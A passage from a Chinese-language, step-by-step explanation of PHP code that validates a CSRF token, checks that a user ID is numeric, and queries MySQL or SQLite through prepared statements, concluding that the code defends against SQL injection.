2. 接下来，代码会调用 `checkToken()` 函数来验证反跨站请求伪造（CSRF）令牌。该函数会使用 `$_REQUEST['user_token']` 和 `$_SESSION['session_token']` 的值进行比较，以确保请求是合法的。'index.php' 是用于生成令牌时传递的参考值。
    
3. 然后，代码将 `exists` 变量初始化为 `false`，用于记录ID在数据库中是否存在。
    
4. 获取用户输入的ID，通过 `$_GET['id']` 来获取。
    
5. 使用 `is_numeric()` 函数检查用户输入的ID是否为数字。如果是数字，则将其转换为整数类型（使用 `intval()` 函数），并进一步处理。
    
6. 根据配置文件中定义的数据库类型（例如，MySQL或SQLite），代码会根据相应的数据库类型执行不同的查询。
    
7. 对于MySQL数据库，代码使用预处理语句（Prepared Statement）来执行查询。首先，使用 `prepare()` 函数准备查询语句，其中 `:id` 是一个占位符。然后，使用 `bindParam()` 函数将真实的ID值绑定到占位符上，并指定参数的类型为整数。最后，调用 `execute()` 函数执行查询，并使用 `rowCount()` 函数获取结果集中的行数。
    
8. 对于SQLite数据库，代码首先获取全局变量 `$sqlite_db_connection`，该变量是一个SQLite数据库连接对象。然后，使用 `prepare()` 函数准备查询语句，其中 `:id` 是一个占位符。接下来，使用 `bindValue()` 函数将真实的ID值绑定到占位符上，并指定参数的类型为SQLite整数。然后，调用 `execute()` 函数执行查询，并通过 `fetchArray()` 函数获取结果数组。最后，通过比较结果数组中的值来确定是否存在符合条件的记录。
    
9. 如果存在符合条件的记录（即 `$exists` 为 `true`），则打印出 "User ID exists in the database." 的提示信息。
    
10. 如果不存在符合条件的记录（即 `$exists` 为 `false`），则将HTTP响应标头设置为 "404 Not Found" 并打印出 "User ID is MISSING from the database." 的提示信息。
    
11. 最后，代码调用 `generateSessionToken()` 函数生成新的反CSRF令牌，用于下一次请求。
    

这段代码验证了CSRF令牌、检查和转换用户输入的ID、使用了 is_numeric() 函数对用户输入进行了基本验证，也有效防止了 SQL 注入攻击。